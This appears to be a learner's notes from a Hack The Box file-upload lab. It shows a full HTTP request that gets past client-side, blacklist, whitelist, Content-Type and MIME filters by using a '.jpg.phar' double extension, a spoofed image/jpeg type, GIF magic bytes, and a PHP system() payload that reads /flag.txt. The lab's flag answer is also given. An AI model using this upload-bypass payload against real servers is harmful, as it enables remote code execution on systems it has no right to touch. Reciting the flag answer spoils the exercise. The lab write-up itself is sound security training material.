# Type Filters
## Content-Type
We may start by fuzzing the Content-Type header with SecLists' [Content-Type Wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt) through Burp Intruder, to see which types are allowed.

## Questions
1. The above server employs Client-Side, Blacklist, Whitelist, Content-Type, and MIME-Type filters to ensure the uploaded file is an image. Try to combine all of the attacks you learned so far to bypass these filters and upload a PHP file and read the flag at "/flag.txt" **Answer: HTB{m461c4l_c0n73n7_3xpl0174710n}**
   - Try the double extension technique (bruteforce with Intruder → found `.phar` works) with the spoofed MIME type technique:
        ```
        POST /upload.php HTTP/1.1
        Host: 154.57.164.79:30243
        Content-Length: 230
        X-Requested-With: XMLHttpRequest
        Accept-Language: en-US,en;q=0.9
        Accept: */*
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryctfIVf5fkSyibhDS
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Origin: http://154.57.164.79:30243
        Referer: http://154.57.164.79:30243/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        ------WebKitFormBoundaryctfIVf5fkSyibhDS
        Content-Disposition: form-data; name="uploadFile"; filename="test.jpg.phar"
        Content-Type: image/jpeg

        GIF8
        <?php system('cat /flag.txt');?>
        ------WebKitFormBoundaryctfIVf5fkSyibhDS--
        ```